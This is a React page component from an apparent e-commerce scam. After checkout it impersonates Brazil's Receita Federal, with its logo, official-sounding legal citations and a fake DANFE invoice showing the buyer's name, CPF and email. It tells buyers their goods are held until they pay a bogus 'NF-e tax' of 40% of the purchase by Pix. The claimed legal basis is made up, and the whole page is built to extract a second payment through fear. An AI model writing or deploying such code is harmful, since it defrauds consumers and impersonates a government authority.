import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { AlertTriangle, Loader2, X } from "lucide-react";
import { useParentOrder } from "@/lib/useParentOrder";
import { useChildPix } from "@/lib/useChildPix";
import PixDisplay from "@/components/PixDisplay";
import { formatBRL } from "@/data/products";
import { getUrlWithUtm } from "@/utils/utm";

function maskCpf(doc?: string | null) {
  if (!doc) return "—";
  const d = doc.replace(/\D/g, "");
  if (d.length !== 11) return doc;
  return `${d.slice(0, 3)}.${d.slice(3, 6)}.${d.slice(6, 9)}-${d.slice(9)}`;
}

function genNumber(id: string) {
  let h = 0;
  for (let i = 0; i < id.length; i++) h = (h * 31 + id.charCodeAt(i)) >>> 0;
  return String(h).padStart(9, "0").slice(0, 9);
}

export default function NotaFiscalPage() {
  const { externalId = "" } = useParams<{ externalId: string }>();
  const navigate = useNavigate();
  const { order: parent, loading } = useParentOrder(externalId);
  const [showDanfe, setShowDanfe] = useState(false);

  const taxaCentavos = useMemo(() => Math.round((parent?.amount ?? 0) * 0.4), [parent]);
  const nfeNumber = useMemo(() => (parent ? genNumber(parent.external_id) : "000000000"), [parent]);
  const productName = useMemo(() => {
    if (!parent?.items?.length) return "PRODUTO";
    return parent.items[0]?.name ?? "PRODUTO";
  }, [parent]);

  const { childId, loading: creating, error } = useChildPix({
    parent: parent
      ? {
          external_id: parent.external_id,
          buyer_name: parent.buyer_name,
          buyer_email: parent.buyer_email,
          buyer_document: parent.buyer_document,
          buyer_phone: parent.buyer_phone,
          ttclid: parent.ttclid,
        }
      : null,
    amountCents: taxaCentavos,
    storeSlug: "nf",
    itemId: "nfe-taxa",
    itemName: `Taxa NF-e referente ao pedido #${externalId}`,
    autoStart: showDanfe,
  });

  if (loading) {
    return (
      <div className="flex min-h-screen items-center justify-center">
        <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
      </div>
    );
  }

  if (!parent) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center px-4 text-center">
        <p className="text-muted-foreground">Pedido não encontrado.</p>
        <button
          onClick={() => navigate(getUrlWithUtm("/"))}
          className="mt-4 rounded-full bg-primary px-6 py-2 text-sm font-semibold text-primary-foreground"
        >
          Voltar à loja
        </button>
      </div>
    );
  }

  const shortId = parent.external_id.slice(-3).toUpperCase();
  const firstName = parent.buyer_name.split(" ")[0];

  if (!showDanfe) {
    return (
      <div className="min-h-screen bg-muted/30 py-4">
        <Helmet>
          <title>Pendência Receita Federal — NF-e</title>
        </Helmet>
        <div className="mx-auto max-w-md px-3">
          <div className="overflow-hidden rounded-2xl border bg-background shadow-sm">
            <div className="flex items-center justify-between border-b px-5 py-3">
              <h1 className="text-base font-bold">Pedido #{shortId}</h1>
              <button
                onClick={() => navigate(getUrlWithUtm("/"))}
                className="text-muted-foreground hover:text-foreground"
              >
                <X className="h-5 w-5" />
              </button>
            </div>

            <div className="px-5 py-4">
              <div className="flex items-center justify-around rounded-xl border bg-muted/30 px-4 py-4">
                <div className="flex items-center gap-2">
                  <div className="flex h-9 w-9 items-center justify-center rounded bg-[#0c2d6b] text-white">
                    <svg viewBox="0 0 24 24" className="h-5 w-5" fill="currentColor"><path d="M3 12l9-7 9 7-2 1-7-5-7 5-2-1zm2 2l7 5 7-5v6H5v-6z"/></svg>
                  </div>
                  <div className="leading-tight">
                    <p className="text-[10px] font-semibold uppercase text-[#0c2d6b]">Receita</p>
                    <p className="text-sm font-bold text-[#0c2d6b]">Federal</p>
                  </div>
                </div>
                <div className="h-8 w-px bg-border" />
                <div className="text-xs font-bold">
                  <span className="text-[#1f7a3a]">NFS</span>
                  <span className="text-[#0c5fb3]">e</span>
                  <p className="text-[9px] font-normal text-muted-foreground">Nota Fiscal de<br/>Serviço eletrônica</p>
                </div>
              </div>

              <div className="mt-4 rounded-md border border-red-200 bg-red-50 px-3 py-2.5 text-center">
                <p className="flex items-center justify-center gap-1.5 text-sm font-bold text-red-600">
                  <AlertTriangle className="h-4 w-4" /> PENDÊNCIA IDENTIFICADA — 1 ITEM
                </p>
              </div>
            </div>

            <div className="border-t px-5 py-4 text-sm leading-relaxed text-foreground/90">
              <p className="text-[11px] font-semibold uppercase tracking-wide text-muted-foreground">
                Secretaria Especial da Receita Federal do Brasil
              </p>
              <p className="mt-3">
                Nos termos da <strong>Instrução Normativa RFB nº 2.119/2022</strong> e da legislação tributária vigente,
                toda aquisição está sujeita à obrigatória emissão de <strong>Nota Fiscal Eletrônica (NF-e)</strong>,
                documento indispensável para o transporte e a transferência de titularidade do bem.
              </p>
              <p className="mt-3">
                Considerando que o ônus tributário relativo à emissão da NF-e recai integralmente sobre o adquirente,
                na forma do art. 11 da referida instrução normativa.
              </p>
              <p className="mt-3">
                <strong>Sem a quitação deste tributo, o bem não poderá ser transportado nem entregue ao destinatário</strong>,
                ficando retido no armazém fiscal até a regularização da pendência.
              </p>

              <div className="mt-4 rounded-md border border-red-200 bg-red-50 px-3 py-2.5 text-sm">
                <p className="font-bold text-red-700">Valor da Emissão da NF-e: {formatBRL(taxaCentavos / 100)}</p>
                <p className="text-xs text-red-600">
                  Calculado sobre 40% do valor de arrematação: {formatBRL(parent.amount / 100)}
                </p>
              </div>
            </div>

            <div className="border-t px-5 py-4">
              <button
                onClick={() => setShowDanfe(true)}
                className="w-full rounded-md bg-red-600 py-3 text-sm font-bold text-white shadow-sm hover:bg-red-700"
              >
                Resolver 1 pendência
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // DANFE + PIX
  return (
    <div className="min-h-screen bg-muted/30 py-4">
      <Helmet>
        <title>DANFE — Pagamento NF-e</title>
      </Helmet>
      <div className="mx-auto max-w-md px-3">
        <div className="overflow-hidden rounded-2xl border bg-background shadow-sm">
          <div className="flex items-center justify-between border-b px-5 py-3">
            <h1 className="text-base font-bold">Pedido #{shortId}</h1>
            <button
              onClick={() => navigate(getUrlWithUtm("/"))}
              className="text-muted-foreground hover:text-foreground"
            >
              <X className="h-5 w-5" />
            </button>
          </div>

          <div className="px-5 py-4">
            <div className="rounded-md border border-amber-300 bg-amber-50 px-3 py-3 text-sm text-amber-900">
              <p className="flex items-center gap-1.5 font-bold">
                <AlertTriangle className="h-4 w-4" /> Emissão de Nota Fiscal obrigatória
              </p>
              <p className="mt-2 text-xs leading-relaxed">
                Por determinação da <strong>Lei Federal nº 14.218/2021</strong>, todo produto deve ter
                a NF-e emitida antes da liberação da entrega. O valor cobrado corresponde a{" "}
                <strong>40% do valor da compra</strong> — base de cálculo prevista na legislação tributária.
              </p>
            </div>
          </div>

          <div className="mx-5 mb-4 overflow-hidden rounded-xl border">
            <div className="flex items-center justify-between gap-3 px-4 py-3">
              <div className="flex items-center gap-2">
                <div className="flex h-9 w-9 items-center justify-center rounded bg-[#0c2d6b] text-white">
                  <svg viewBox="0 0 24 24" className="h-5 w-5" fill="currentColor"><path d="M3 12l9-7 9 7-2 1-7-5-7 5-2-1zm2 2l7 5 7-5v6H5v-6z"/></svg>
                </div>
                <div className="leading-tight">
                  <p className="text-[10px] font-semibold uppercase text-[#0c2d6b]">Receita</p>
                  <p className="text-sm font-bold text-[#0c2d6b]">Federal</p>
                </div>
              </div>
              <div className="text-center">
                <p className="text-base font-extrabold">DANFE</p>
                <p className="text-[9px] text-muted-foreground">Documento Auxiliar<br/>da NF-e</p>
              </div>
              <div className="text-xs font-bold text-right">
                <span className="text-[#1f7a3a]">NFS</span>
                <span className="text-[#0c5fb3]">e</span>
              </div>
            </div>

            <div className="border-t px-4 py-2 text-center text-xs">
              NF-e Nº <strong>{nfeNumber}</strong> — Série 001
            </div>

            <div className="border-t px-4 py-3 text-xs">
              <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">Emitente</p>
              <p className="mt-1 text-sm font-bold">OLYMPICOS</p>
              <p className="text-muted-foreground">CNPJ: 18.565.468/0012-41</p>
              <p className="text-muted-foreground">Estrada Municipal Luiz Lopes Neto, 21, Tenentes — Extrema/MG — CEP: 37640-000</p>
            </div>

            <div className="border-t px-4 py-3 text-xs">
              <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">Destinatário</p>
              <div className="mt-1 flex justify-between gap-3">
                <p className="font-medium">{parent.buyer_name || "—"}</p>
                <p className="text-muted-foreground">CPF: <span className="text-foreground">{maskCpf(parent.buyer_document)}</span></p>
              </div>
              <p className="mt-1 text-muted-foreground">E-mail: {parent.buyer_email ?? "—"}</p>
            </div>

            <div className="border-t px-4 py-3 text-xs">
              <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">Produto / Mercadoria</p>
              <p className="mt-1 text-sm font-bold uppercase">{productName}</p>
              <p className="text-muted-foreground">Ref. pedido: #{parent.external_id}</p>
            </div>

            <div className="border-t px-4 py-3 text-xs">
              <p className="text-[10px] font-semibold uppercase tracking-wide text-muted-foreground">Valores Fiscais</p>
              <div className="mt-1 space-y-1">
                <div className="flex justify-between"><span>Valor pago</span><span className="font-semibold">{formatBRL(parent.amount / 100)}</span></div>
                <div className="flex justify-between"><span>Base de cálculo NF-e (40%)</span><span className="font-semibold">{formatBRL(taxaCentavos / 100)}</span></div>
                <div className="my-1 border-t" />
                <div className="flex justify-between"><span className="font-bold">VALOR TOTAL DA NF-e</span><span className="text-lg font-extrabold text-red-600">{formatBRL(taxaCentavos / 100)}</span></div>
              </div>
            </div>
          </div>

          <div className="border-t px-5 py-4">
            <p className="text-center text-[11px] font-semibold uppercase tracking-wide text-muted-foreground">
              Pagamento via Pix — Receita Federal
            </p>
            <div className="mt-3">
              {creating || !childId ? (
                <div className="flex flex-col items-center gap-2 py-8 text-muted-foreground">
                  <Loader2 className="h-6 w-6 animate-spin" />
                  <p className="text-xs">Gerando Pix da NF-e...</p>
                </div>
              ) : (
                <PixDisplay externalId={childId} />
              )}
              {error && <p className="mt-2 text-center text-xs text-red-600">{error}</p>}
            </div>
            <p className="mt-3 text-center text-[11px] text-muted-foreground">
              {firstName}, sua entrega só será liberada após a quitação da NF-e.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
